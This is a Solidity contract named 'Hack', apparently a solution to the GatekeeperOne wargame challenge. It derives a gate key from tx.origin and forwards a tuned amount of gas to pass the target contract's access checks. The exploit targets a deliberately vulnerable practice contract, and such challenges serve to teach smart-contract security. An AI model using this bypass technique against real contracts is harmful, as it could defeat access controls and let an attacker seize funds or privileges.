// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./GatekeeperOne.sol";

contract Hack {
   function enter(address _target, uint256 gas) external {
       GatekeeperOne target = GatekeeperOne(_target);

       uint16 k16 = uint16(uint160(tx.origin));
       uint64 k64 = uint64(1 << 63) + uint64(k16);
       bytes8 key = bytes8(k64);

       require(gas < 8191, "gas >= 8191");
       require(target.enter{gas: 8191 * 10 + gas}(key), "failed");
   } 
}
